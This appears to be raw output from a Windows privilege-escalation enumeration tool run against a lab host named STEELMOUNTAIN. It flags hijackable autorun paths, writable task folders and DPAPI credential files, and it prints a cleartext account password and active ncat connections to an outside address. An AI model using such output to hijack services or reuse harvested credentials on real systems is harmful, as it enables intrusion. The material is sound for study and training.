    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DllDirectory
    Folder: C:\Windows\system32
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DllDirectory32
    Folder: C:\Windows\syswow64
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64cpu
    Folder: None (PATH Injection)
    File: Wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64win
    Folder: None (PATH Injection)
    File: Wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: LPK
    Folder: None (PATH Injection)
    File: LPK.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64
    Folder: None (PATH Injection)
    File: Wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Users [AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{44BBA840-CC51-11CF-AAFA-00AA00B6015C}
    Key: StubPath
    Folder: C:\Program Files\Windows Mail
    File: C:\Program Files\Windows Mail\WinMail.exe OCInstallUserConfigOE (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenUser
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{44BBA840-CC51-11CF-AAFA-00AA00B6015C}
    Key: StubPath
    Folder: C:\Program Files\Windows Mail
    File: C:\Program Files\Windows Mail\WinMail.exe OCInstallUserConfigOE (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{10921475-03CE-4E04-90CE-E2E7EF20C814}                                                                                                                          
    Folder: C:\Program Files (x86)\IObit\IObit Uninstaller
    FolderPerms: bill [WriteData/CreateFiles]
    File: C:\Program Files (x86)\IObit\IObit Uninstaller\UninstallExplorer.dll (Unquoted and Space detected)
    FilePerms: bill [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Ec2WallpaperInfo.url (Unquoted and Space detected)
   =================================================================================================


    Folder: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: bill [AllAccess]
    File: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
    FilePerms: bill [AllAccess]
   =================================================================================================


    Folder: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: bill [AllAccess]
    File: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe (Unquoted and Space detected)
    FilePerms: bill [AllAccess]
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


����������͹ Scheduled Applications --Non Microsoft--
� Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                        
    (STEELMOUNTAIN\Administrator) hfs: C:\Users\bill\Desktop\hfs.exe 
    Trigger: At system startup
    
   =================================================================================================


����������͹ Device Drivers --Non Microsoft--
� Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#vulnerable-drivers                                                                                           
    XENBUS - 8.2.7.58 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenbus.sys
    XEN - 8.2.7.58 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xen.sys
    XENFILT - 8.2.7.58 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenfilt.sys
    VIA PCI IDE MINI Driver - 6,0,6000,170 [VIA Technologies, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\viaide.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.22 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    Broadcom NetXtreme II GigE - 7.4.14.0 [Broadcom Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    Broadcom NetXtreme II 10 GigE - 7.4.33.1 [Broadcom Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys                                                                                                                            
    Adaptec RAID Controller - 7.2.0.30261 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.22 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.82 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys                                                                                                                             
    LSI SAS Gen2 Driver (StorPort) - 2.00.60.82 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2.sys
    LSI SAS Gen3 Driver (StorPort) - 2.50.65.01 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys                                                                                                                             
    Marvell Flash Controller -  1.0.5.1015  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys                                                                                                                            
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys                                                                                                                             
    MEGASAS RAID Controller Driver for Windows - 6.600.21.08 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys                                                                                                                      
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Intel Rapid Storage Technology driver (inbox) - 12.0.1.1018 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAV.sys                                                                                                                
    AHCI 1.3 Device Driver - 1.1.4.14 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.4.14 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys                                                                                                                  
    VIA RAID driver - 7.0.9200,6320 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys                                                                                                              
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys                                                                                                                 
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys                                                                                                                        
    QLogic Fibre Channel Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys                                                                                                                 
    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys                                                                                                                          
    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys                                                                                                                    
    Emulex WS2K12 Storport Miniport Driver x64 - 2.74.214.004 05/23/2013 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys                                                                                                 
    Emulex WS2K12 Storport Miniport Driver x64 - 2.74.214.004 05/23/2013 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys                                                                                                 
    Brocade FC/FCoE HBA Stor Miniport Driver - 3.2.2.5 [Brocade Communications Systems, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys                                                                                                         
    Brocade FC/FCoE HBA Stor Miniport Driver - 3.2.2.5 [Brocade Communications Systems, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys                                                                                                     
    XENVBD - 8.3.1.56 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenvbd.sys
    XENCRSH - 8.3.1.56 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xencrsh.sys
    Amazon NVMe Storage Driver - V1.3.1 [Amazon]: \\.\GLOBALROOT\SystemRoot\System32\drivers\AWSNVMe.sys
    PMC-Sierra HBA Controller - 1.0.0.0254 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys                                                                                   
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mlx4_bus.sys
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ibbus.sys
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ndfltr.sys
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\winverbs.sys
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\winmad.sys
    Broadcom iSCSI offload driver - 7.4.4.0 [Broadcom Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys
    Broadcom FCoE offload driver - 7.4.6.0 [Broadcom Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys
    XENVIF - 8.2.8.27 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenvif.sys
    XENIFACE - 8.2.5.39 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xeniface.sys
    XENNET - 8.2.5.32 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\xennet.sys
    Macrovision SECURITY Driver - SECURITY Driver 4.03.086 2006/09/13 [Macrovision Corporation, Macrovision Europe Limited, and Macrovision Japan and Asia K.K.]: \\.\GLOBALROOT\SystemRoot\System32\Drivers\secdrv.SYS


�����������������������������������͹ Network Information �������������������������������������

����������͹ Network Shares
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )

����������͹ Enumerate Network Mapped Drives (WMI)

����������͹ Host File

����������͹ Network Ifaces and known hosts
� The masks are only for the IPv4 addresses 
  [X] Exception: The requested protocol has not been configured into the system, or no implementation for it exists
    Ethernet 2[02:DD:8B:29:77:B7]: 10.10.175.80, fe80::38b2:843f:fc6e:f37a%14 / 255.255.0.0
        Gateways: 10.10.0.1
        DNSs: 10.0.0.2
    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

����������͹ Current TCP Listening Ports
� Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                              
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         732             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         1996            svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               8080          0.0.0.0               0               Listening         468             C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49152         0.0.0.0               0               Listening         552             wininit
  TCP        0.0.0.0               49153         0.0.0.0               0               Listening         964             svchost
  TCP        0.0.0.0               49154         0.0.0.0               0               Listening         996             svchost
  TCP        0.0.0.0               49155         0.0.0.0               0               Listening         1212            spoolsv
  TCP        0.0.0.0               49156         0.0.0.0               0               Listening         648             lsass
  TCP        0.0.0.0               49169         0.0.0.0               0               Listening         640             services
  TCP        0.0.0.0               49170         0.0.0.0               0               Listening         1156            svchost
  TCP        10.10.175.80          139           0.0.0.0               0               Listening         4               System
  TCP        10.10.175.80          49395         10.18.21.236          444             Established       1112            C:\Users\Public\ncat.exe
  TCP        10.10.175.80          49407         10.18.21.236          443             Established       2948            C:\Users\Public\ncat.exe
  TCP        10.10.175.80          49428         169.254.169.254       80              Close Wait        1664            Ec2Config

  Enumerating IPv6 connections
                                                                                                                              
  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        80            [::]                                        0               Listening         4               System
  TCP        [::]                                        135           [::]                                        0               Listening         732             svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        3389          [::]                                        0               Listening         1996            svchost
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49152         [::]                                        0               Listening         552             wininit
  TCP        [::]                                        49153         [::]                                        0               Listening         964             svchost
  TCP        [::]                                        49154         [::]                                        0               Listening         996             svchost
  TCP        [::]                                        49155         [::]                                        0               Listening         1212            spoolsv
  TCP        [::]                                        49156         [::]                                        0               Listening         648             lsass
  TCP        [::]                                        49169         [::]                                        0               Listening         640             services
  TCP        [::]                                        49170         [::]                                        0               Listening         1156            svchost

����������͹ Current UDP Listening Ports
� Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                              
  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            444               svchost
  UDP        0.0.0.0               500           *:*                            996               svchost
  UDP        0.0.0.0               3389          *:*                            1996              svchost
  UDP        0.0.0.0               4500          *:*                            996               svchost
  UDP        0.0.0.0               5355          *:*                            536               svchost
  UDP        10.10.175.80          137           *:*                            4                 System
  UDP        10.10.175.80          138           *:*                            4                 System

  Enumerating IPv6 connections
                                                                                                                              
  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            444               svchost
  UDP        [::]                                        500           *:*                            996               svchost
  UDP        [::]                                        3389          *:*                            1996              svchost
  UDP        [::]                                        4500          *:*                            996               svchost
  UDP        [::]                                        5355          *:*                            536               svchost

����������͹ Firewall Rules
� Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: PUBLIC
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    False
    FirewallEnabled (Public):    False
    DENY rules:

����������͹ DNS cached --limit 70--
    Entry                                 Name                                  Data
    win8.ipv6.microsoft.com                                                     

����������͹ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKCU        EmailName                                 User@
  HKCU        AutoConfigProxy                           wininet.dll
  HKCU        MimeExclusionListForCache                 multipart/mixed multipart/x-mixed-replace multipart/x-byteranges 
  HKCU        WarnOnPost                                System.Byte[]
  HKCU        UseSchannelDirectly                       System.Byte[]
  HKCU        EnableHttp1_1                             1
  HKCU        UrlEncoding                               0
  HKCU        SecureProtocols                           2720
  HKCU        PrivacyAdvanced                           0
  HKCU        DisableCachingOfSSLPages                  1
  HKCU        WarnonZoneCrossing                        1
  HKCU        CertificateRevocation                     1
  HKCU        EnableNegotiate                           1
  HKCU        MigrateProxy                              1
  HKCU        ProxyEnable                               0
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        WarnOnIntranet                            1
  HKLM        MinorVersion                              0
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files

  Zone Maps                                                                                                                   
  No URLs configured

  Zone Auth Settings                                                                                                          
  No Zone Auth Settings


�����������������������������������͹ Windows Credentials �������������������������������������

����������͹ Checking Windows Vault
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
    Not Found

����������͹ Checking Credential manager
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


     Username:              STEELMOUNTAIN\bill
     Password:               PMBAf5KhZAxVhvqb
     Target:                STEELMOUNTAIN\bill
     PersistenceType:       Enterprise
     LastWriteTime:         9/27/2019 5:22:42 AM

   =================================================================================================


����������͹ Saved RDP connections
    Not Found

����������͹ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :       
    Block Clipboard Redirection             :       
    Block COM Port Redirection              :       
    Block Drive Redirection                 :       
    Block LPT Port Redirection              :       
    Block PnP Device Redirection            :       
    Block Printer Redirection               :       
    Allow Smart Card Redirection            :       

  RDP Client Settings                                                                                                         
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

����������͹ Recently run commands
    Not Found

����������͹ Checking for DPAPI Master Keys
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\bill\AppData\Roaming\Microsoft\Protect\S-1-5-21-3029548963-3893655183-1231094572-1001\08ab9046-d6af-45b3-89d6-6c220039560f
    Accessed: 4/23/2024 6:49:22 AM
    Modified: 4/23/2024 6:49:22 AM
   =================================================================================================

    MasterKey: C:\Users\bill\AppData\Roaming\Microsoft\Protect\S-1-5-21-3029548963-3893655183-1231094572-1001\d456e499-348f-4047-86b6-13258a8ece85
    Accessed: 9/26/2019 11:29:04 PM
    Modified: 9/26/2019 11:29:04 PM
   =================================================================================================


����������͹ Checking for DPAPI Credential Files
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    CredFile: C:\Users\bill\AppData\Roaming\Microsoft\Credentials\16E038FE7CEF476A77403E8E0EE760B8
    Description: Enterprise Credential Data
    MasterKey: d456e499-348f-4047-86b6-13258a8ece85
    Accessed: 9/27/2019 5:22:42 AM
    Modified: 9/27/2019 5:22:42 AM
    Size: 506
   =================================================================================================

� Follow the provided link for further instructions in how to decrypt the creds file

����������͹ Checking for RDCMan Settings Files
� Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager                                                                                
    Not Found

����������͹ Looking for Kerberos tickets
�  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    Not Found

����������͹ Looking for saved Wifi credentials
  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)                                                                                                                            
